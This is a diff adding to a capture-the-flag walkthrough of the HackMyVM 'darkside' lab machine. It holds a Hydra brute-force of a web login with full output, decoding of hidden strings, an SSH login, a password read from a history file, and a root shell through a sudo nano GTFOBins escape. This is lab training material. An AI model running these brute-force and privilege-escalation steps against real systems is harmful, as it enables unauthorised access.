@@ -83,51 +83,158 @@ Since the result was a draw, we will let you enter the darkside, or at least tem
 
 
 ```bash
+gareth@gareth:~/hackmyvm/darkside$ hydra -l kevin -P /opt/rockyou.txt 192.168.0.181 http-post-form "/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -VV -F -I
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-30 17:04:00
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-post-form://192.168.0.181:80/index.php:user=^USER^&pass=^PASS^:Username or password invalid
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "123456" - 1 of 14344398 [child 0] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "12345" - 2 of 14344398 [child 1] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "password" - 4 of 14344398 [child 3] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "iloveyou" - 5 of 14344398 [child 4] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "princess" - 6 of 14344398 [child 5] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "1234567" - 7 of 14344398 [child 6] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "rockyou" - 8 of 14344398 [child 7] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "12345678" - 9 of 14344398 [child 8] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "abc123" - 10 of 14344398 [child 9] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "nicole" - 11 of 14344398 [child 10] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "daniel" - 12 of 14344398 [child 11] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "babygirl" - 13 of 14344398 [child 12] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "monkey" - 14 of 14344398 [child 13] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "lovely" - 15 of 14344398 [child 14] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "jessica" - 16 of 14344398 [child 15] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "654321" - 17 of 14344398 [child 0] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "michael" - 18 of 14344398 [child 2] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "ashley" - 19 of 14344398 [child 5] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "qwerty" - 20 of 14344398 [child 1] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "111111" - 21 of 14344398 [child 3] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "iloveu" - 22 of 14344398 [child 6] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "000000" - 23 of 14344398 [child 7] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "michelle" - 24 of 14344398 [child 8] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "tigger" - 25 of 14344398 [child 9] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "sunshine" - 26 of 14344398 [child 10] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "chocolate" - 27 of 14344398 [child 11] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "password1" - 28 of 14344398 [child 12] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "soccer" - 29 of 14344398 [child 13] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "anthony" - 30 of 14344398 [child 14] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "friends" - 31 of 14344398 [child 15] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "butterfly" - 32 of 14344398 [child 2] (0/0)
+[ATTEMPT] target 192.168.0.181 - login "kevin" - pass "purple" - 33 of 14344398 [child 0] (0/0)
+[80][http-post-form] host: 192.168.0.181   login: kevin   password: iloveyou
+[STATUS] attack finished for 192.168.0.181 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-30 17:04:01
+```
+
+```bash
+kevin:iloveyou
+```
+
+
+Logging in:
+
+![[Pasted image 20241030170623.png]]
+
+```bash
+gareth@gareth:~/hackmyvm/darkside$ echo 'kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC' | base58 -d
+c2ZxZWttZ25jdXRqaGJ5cHZ4ZGEub25pb24=
+gareth@gareth:~/hackmyvm/darkside$ echo 'c2ZxZWttZ25jdXRqaGJ5cHZ4ZGEub25pb24=' | base64 -d
+sfqekmgncutjhbypvxda.onion
+```
+
+![[Pasted image 20241030171011.png]]
+![[Pasted image 20241030171407.png]]
+
+![[Pasted image 20241030171322.png]]
+
+```bash
+gareth@gareth:~/hackmyvm/darkside$ ssh kevin@192.168.0.181
+kevin@192.168.0.181's password: 
+Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
+kevin@darkside:~$ ls -lash
+total 32K
+4.0K drwxr-xr-x 3 kevin kevin 4.0K Oct 30  2023 .
+4.0K drwxr-xr-x 4 root  root  4.0K Oct 15  2023 ..
+   0 lrwxrwxrwx 1 kevin kevin    9 Oct 30  2023 .bash_history -> /dev/null
+4.0K -rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout
+4.0K -rw-r--r-- 1 kevin kevin 3.5K Oct 15  2023 .bashrc
+4.0K -rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .history
+4.0K drwxr-xr-x 3 kevin kevin 4.0K Oct 15  2023 .local
+4.0K -rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile
+4.0K -rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt
+kevin@darkside:~$ cat user.txt 
+UnbelievableHumble
+```
+
+```bash
+kevin@darkside:~$ cat .history 
+ls -al
+hostname -I
+echo "Congratulations on the OSCP Xerosec"
+top
+ps -faux
+su rijaba
+ILoveJabita
+ls /home/rijaba
 
 ```
 
 ```bash
+kevin@darkside:~$ su rijaba
+Password: 
+rijaba@darkside:/home/kevin$ whoami && id
+rijaba
+uid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)
+```
+
+
+```bash
+rijaba@darkside:/home/kevin$ sudo -l
+Matching Defaults entries for rijaba on darkside:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User rijaba may run the following commands on darkside:
+    (root) NOPASSWD: /usr/bin/nano
+```
+
+GTFO bins: https://gtfobins.github.io/gtfobins/nano/#sudo
+
+```bash
+rijaba@darkside:/home/kevin$ sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+```
 
 ```
 
 ```bash
+                                                                                                               [ Executing... ]# 
+#  Help                                        M-F New Buffer                                 ^S Spell Check                                 ^J Full Justify                                ^V Cut Till End
+#  Cancel                                      M-\ Pipe Text                                  ^Y Linter                                      ^O Formatter                                   ^Z Suspend
+# whoami && id
+root
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+  ██████╗░░█████╗░██████╗░██╗░░██╗░██████╗██╗██████╗░███████╗
+  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██║██╔══██╗██╔════╝
+  ██║░░██║███████║██████╔╝█████═╝░╚█████╗░██║██║░░██║█████╗░░
+  ██║░░██║██╔══██║██╔══██╗██╔═██╗░░╚═══██╗██║██║░░██║██╔══╝░░
+  ██████╔╝██║░░██║██║░░██║██║░╚██╗██████╔╝██║██████╔╝███████╗
+  ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═════╝░╚══════╝
 
+
+youcametothedarkside
+#
 ```
 
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
